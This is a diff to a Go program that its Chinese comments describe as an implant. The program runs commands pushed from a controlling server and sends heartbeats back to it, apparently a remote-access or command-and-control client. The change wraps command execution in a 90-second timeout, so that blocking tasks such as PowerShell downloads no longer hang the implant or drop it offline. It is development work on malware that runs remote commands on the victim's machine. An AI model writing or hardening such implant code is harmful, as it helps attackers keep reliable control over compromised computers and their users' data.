@@ -3,6 +3,7 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"os"
 	"os/exec"
@@ -10,8 +11,14 @@ import (
 	"strings"
 	"sync"
 	"syscall"
+	"time"
 	"unsafe"
 )
+
+// cmdTimeout 一次性命令最大运行时长：防止 agent 下发的阻塞/交互命令（如
+// powershell 下载、ping 长循环）把植入端拖死在执行上，导致心跳超时被服务端
+// 判定离线（前端显示 network error）。超时后杀子进程，植入端继续跑。
+const cmdTimeout = 90 * time.Second
 
 func getUsername() string {
 	username := os.Getenv("USERNAME")
@@ -78,20 +85,30 @@ func buildCmd(command string) (*exec.Cmd, func()) {
 }
 
 func executeCommand(command string, args []string) (string, int32, string) {
+	// 用可超时的 context 执行一次性命令，避免阻塞/交互命令拖死植入端。
+	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
+	defer cancel()
+
 	var cmd *exec.Cmd
 
 	if len(args) > 0 {
-		cmd = exec.Command(command, args...)
+		cmd = exec.CommandContext(ctx, command, args...)
 	} else {
 		c, cleanup := buildCmd(command)
 		defer cleanup()
 		cmd = c
+		// buildCmd 返回的是 exec.Command，需用 context 包装为 CommandContext
+		cmd = exec.CommandContext(ctx, cmd.Path, cmd.Args[1:]...)
 	}
 	cmd.Dir = os.Getenv("USERPROFILE")
 	cmd.SysProcAttr = getSysProcAttr()
 
 	out, err := cmd.CombinedOutput()
 	if err != nil {
+		// 超时：返回明确提示，植入端继续跑，不因该任务卡死心跳
+		if ctx.Err() == context.DeadlineExceeded {
+			return string(out), -1, "command timed out after " + cmdTimeout.String()
+		}
 		code := int32(-1)
 		if ee, ok := err.(*exec.ExitError); ok {
 			code = int32(ee.ExitCode())
